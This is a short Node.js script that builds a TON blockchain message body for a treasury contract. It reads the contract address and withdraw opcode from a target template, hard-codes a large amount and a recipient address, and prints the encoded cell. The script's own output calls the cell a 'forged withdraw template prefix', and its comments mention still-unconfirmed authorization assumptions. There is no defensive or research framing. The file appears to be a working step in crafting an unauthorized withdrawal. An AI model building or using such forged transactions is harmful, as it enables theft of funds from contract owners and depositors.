const fs = require('fs');
const path = require('path');
const { beginCell, Address } = require('@ton/core');

const targetPath = path.join(__dirname, '..', 'TARGET_TEMPLATE.json');

function loadTarget() {
  return JSON.parse(fs.readFileSync(targetPath, 'utf8'));
}

function required(name, value) {
  if (value === undefined || value === null || value === '') {
    throw new Error(`Missing field: ${name}`);
  }
}

function main() {
  const cfg = loadTarget();
  required('withdraw_opcode_hex', cfg.withdraw_opcode_hex);

  const opcode = Number.parseInt(cfg.withdraw_opcode_hex, 16);
  const queryId = BigInt(0);

  // Observed values from local artifact.
  // Replace as soon as we confirm the tail schema and authorization assumptions.
  const amount = BigInt('371128857363');
  const recipient = Address.parse('0:3edc43486341876383e2d778916cc8cdd066cc353eaab5601d0c6948ee2dae47');

  const body = beginCell()
    .storeUint(opcode, 32)
    .storeUint(queryId, 64)
    .storeCoins(amount)
    .storeAddress(recipient)
    .endCell();

  console.log(JSON.stringify({
    purpose: 'forged withdraw template prefix',
    warning: 'This is only the confirmed prefix of the observed body. The original body still has 267 trailing bits after recipient.',
    treasury: cfg.treasury_address,
    opcode: cfg.withdraw_opcode_hex,
    query_id: queryId.toString(),
    amount: amount.toString(),
    recipient: recipient.toRawString(),
    body_boc_base64: body.toBoc().toString('base64')
  }, null, 2));
}

main();
